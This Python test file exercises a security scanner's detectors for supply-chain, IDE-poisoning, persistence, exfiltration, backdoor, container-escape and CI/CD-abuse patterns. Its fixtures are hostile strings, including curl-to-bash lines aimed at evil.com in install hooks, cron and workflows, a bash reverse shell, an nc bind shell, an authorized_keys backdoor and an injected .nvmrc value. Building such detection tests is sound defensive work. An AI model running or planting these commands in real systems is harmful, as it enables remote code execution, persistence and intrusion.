from pathlib import Path

from security_scanner.detectors.supply_chain import SupplyChainDetector
from security_scanner.detectors.ide_poisoning import IDEPoisoningDetector
from security_scanner.detectors.persistence import PersistenceDetector
from security_scanner.detectors.exfiltration import ExfiltrationDetector
from security_scanner.detectors.command_injection import CommandInjectionDetector
from security_scanner.detectors.backdoor import BackdoorDetector
from security_scanner.detectors.container_escape import ContainerEscapeDetector
from security_scanner.detectors.ci_cd_abuse import CICDAbuseDetector


class TestSupplyChainDetector:
    def setup_method(self):
        self.d = SupplyChainDetector()

    def test_npmrc_hijacking(self):
        findings = self.d.detect_npmrc_hijacking(Path(".npmrc"), "registry=https://evil.com/registry")
        assert len(findings) >= 1
        assert findings[0].severity == "HIGH"

    def test_npmrc_official(self):
        findings = self.d.detect_npmrc_hijacking(Path(".npmrc"), "registry=https://registry.npmjs.org")
        assert len(findings) == 0

    def test_typosquatting(self):
        findings = self.d.detect_typosquatting(Path("package.json"), '{"dependencies": {"event-stream": "1.0.0"}}')
        assert len(findings) == 0  # exact match, not typo

    def test_npm_lifecycle_critical(self):
        content = '{"scripts": {"postinstall": "curl http://evil.com | bash"}}'
        findings = self.d.detect_npm_lifecycle_hooks(Path("package.json"), content)
        assert len(findings) >= 1
        assert findings[0].score >= 80.0

    def test_nvmrc_injection(self):
        findings = self.d.detect_nvmrc_injection(Path(".nvmrc"), "18.0.0; curl http://evil.com")
        assert len(findings) >= 1
        assert findings[0].severity == "HIGH"

    def test_malicious_bin(self):
        findings = self.d.detect_malicious_bin(Path("package.json"), '{"bin": {"evil": "curl http://x"}}')
        assert len(findings) >= 1

    def test_setup_py_rce(self):
        findings = self.d.detect_setup_py_rce(Path("setup.py"), "import os; os.system('curl http://evil')")
        assert len(findings) >= 1

    def test_stdlib_shadow(self):
        findings = self.d.detect_stdlib_shadow(Path("os.py"), "print('shadow')")
        assert len(findings) >= 1

    def test_sitecustomize(self):
        findings = self.d.detect_sitecustomize(Path("sitecustomize.py"), "import subprocess; subprocess.Popen(['evil'])")
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_extra_index_url(self):
        findings = self.d.detect_extra_index_url(Path("requirements.txt"), "--extra-index-url https://evil.com/packages")
        assert len(findings) >= 1


class TestIDEPoisoningDetector:
    def setup_method(self):
        self.d = IDEPoisoningDetector()

    def test_obfuscated_tasks(self):
        content = '{"tasks": [{"label": "evil", "command": "curl http://x | bash", "runOptions": {"runOn": "folderOpen"}}]}'
        findings = self.d.detect_obfuscated_tasks(Path("tasks.json"), content)
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_devcontainer_commands(self):
        content = '{"postCreateCommand": "curl http://evil.com | bash"}'
        findings = self.d.detect_devcontainer_commands(Path("devcontainer.json"), content)
        assert len(findings) >= 1

    def test_devcontainer_sensitive_mounts(self):
        content = '{"mounts": ["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"]}'
        findings = self.d.detect_devcontainer_mounts(Path("devcontainer.json"), content)
        assert len(findings) >= 1

    def test_neovim_autoexec(self):
        findings = self.d.detect_neovim_autoexec(Path("init.lua"), 'vim.cmd("!curl http://evil | bash")')
        assert len(findings) >= 1


class TestPersistenceDetector:
    def setup_method(self):
        self.d = PersistenceDetector()

    def test_git_hook_malicious(self):
        findings = self.d.detect_git_hook_malicious(Path("pre-commit"), "curl http://evil.com | bash")
        assert len(findings) >= 1

    def test_git_editor_hijack(self):
        findings = self.d.detect_git_editor(Path("config"), 'editor = /tmp/evil.sh')
        assert len(findings) >= 1

    def test_git_alias(self):
        findings = self.d.detect_git_aliases(Path("config"), '[alias]\n  evil = !curl http://x | bash')
        assert len(findings) >= 1

    def test_cron_persistence(self):
        findings = self.d.detect_cron_persistence(Path("cron"), "@reboot curl http://evil.com | bash")
        assert len(findings) >= 1

    def test_systemd_persistence(self):
        findings = self.d.detect_systemd_persistence(
            Path("/etc/systemd/system/evil.service"),
            "[Service]\nExecStart=/bin/bash -c 'curl http://x'"
        )
        assert len(findings) >= 1

    def test_direnv_rce(self):
        findings = self.d.detect_direnv_rce(Path(".envrc"), "curl http://evil.com | bash")
        assert len(findings) >= 1

    def test_alias_hijack(self):
        findings = self.d.detect_alias_hijack(Path(".bashrc"), 'alias curl="/path/to/malicious"')
        assert len(findings) >= 1

    def test_submodule_trap(self):
        findings = self.d.detect_submodule_trap(Path(".gitmodules"), "url = http://evil.com/repo.git")
        assert len(findings) >= 1


class TestExfiltrationDetector:
    def setup_method(self):
        self.d = ExfiltrationDetector()

    def test_env_dump(self):
        findings = self.d.detect_env_dump(Path("script.sh"), "printenv > /tmp/data.txt")
        assert len(findings) >= 1

    def test_slack_webhook(self):
        findings = self.d.detect_slack_webhook(Path("config.js"), "https://hooks.slack.com/services/T00/B00/xxx")
        assert len(findings) >= 1

    def test_ngrok_tunnel(self):
        findings = self.d.detect_ngrok_tunnel(Path("config.sh"), "ngrok http 8080")
        assert len(findings) >= 1

    def test_curl_python_abuse(self):
        findings = self.d.detect_curl_python_abuse(Path("script.sh"), "curl http://evil.com | python")
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_sensitive_env_secrets(self):
        findings = self.d.detect_sensitive_env_secrets(Path(".env"), "AWS_SECRET_ACCESS_KEY=mysecretkey123")
        assert len(findings) >= 1


class TestCommandInjectionDetector:
    def setup_method(self):
        self.d = CommandInjectionDetector()

    def test_eval_patterns(self):
        findings = self.d.detect_eval_patterns(Path("script.py"), "eval('print(1)')")
        assert len(findings) >= 1

    def test_js_dangerous(self):
        findings = self.d.detect_js_dangerous(Path("script.js"), "child_process.exec('ls')")
        assert len(findings) >= 1

    def test_deserialization(self):
        findings = self.d.detect_deserialization(Path("script.py"), "pickle.loads(data)")
        assert len(findings) >= 1

    def test_node_options(self):
        findings = self.d.detect_node_options_injection(Path(".env"), 'NODE_OPTIONS="--require /tmp/evil.js"')
        assert len(findings) >= 1


class TestBackdoorDetector:
    def setup_method(self):
        self.d = BackdoorDetector()

    def test_reverse_shell_bash(self):
        findings = self.d.detect_reverse_shells(Path("script.sh"), "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_bind_shell(self):
        findings = self.d.detect_bind_shells(Path("script.sh"), "nc -lvp 4444 -e /bin/bash")
        assert len(findings) >= 1

    def test_hidden_backdoor(self):
        findings = self.d.detect_hidden_backdoors(Path("script.sh"), "echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys")
        assert len(findings) >= 1

    def test_nginx_backdoor(self):
        findings = self.d.detect_nginx_backdoor(Path("nginx.conf"), "proxy_pass http://evil.com/;")
        assert len(findings) >= 1


class TestContainerEscapeDetector:
    def setup_method(self):
        self.d = ContainerEscapeDetector()

    def test_docker_sock_mount(self):
        findings = self.d.detect_docker_sock_mount(Path("docker-compose.yml"), "/var/run/docker.sock:/var/run/docker.sock")
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_host_network(self):
        findings = self.d.detect_host_network(Path("docker-compose.yml"), "network_mode: host")
        assert len(findings) >= 1

    def test_privileged(self):
        findings = self.d.detect_privileged_container(Path("docker-compose.yml"), "privileged: true")
        assert len(findings) >= 1

    def test_docker_pipe_shell(self):
        findings = self.d.detect_docker_pipe_shell(Path("Dockerfile"), "RUN curl http://evil.com | bash")
        assert len(findings) >= 1

    def test_vagrant_rce(self):
        findings = self.d.detect_vagrant_rce(Path("Vagrantfile"), "config.vm.provision 'shell', inline: 'curl http://x'")
        assert len(findings) >= 1


class TestCICDAbuseDetector:
    def setup_method(self):
        self.d = CICDAbuseDetector()

    def test_actions_pipe_shell(self):
        findings = self.d.detect_actions_pipe_shell(Path("workflow.yml"), "run: curl http://evil.com | bash")
        assert len(findings) >= 1
        assert findings[0].severity == "CRITICAL"

    def test_unpinned_actions(self):
        findings = self.d.detect_unpinned_actions(Path("workflow.yml"), "uses: actions/checkout@v3")
        assert len(findings) >= 1

    def test_pinned_actions(self):
        findings = self.d.detect_unpinned_actions(Path("workflow.yml"), "uses: actions/checkout@abc123def456abc123def456abc123def456abc1")
        assert len(findings) == 0

    def test_jenkins_base64(self):
        findings = self.d.detect_jenkins_base64(Path("Jenkinsfile"), "sh 'echo dGVzdA== | base64 -d | bash'")
        assert len(findings) >= 1

    def test_terraform_exec(self):
        findings = self.d.detect_terraform_exec(Path("main.tf"), 'provisioner "local-exec" { command = "curl http://x | bash" }')
        assert len(findings) >= 1
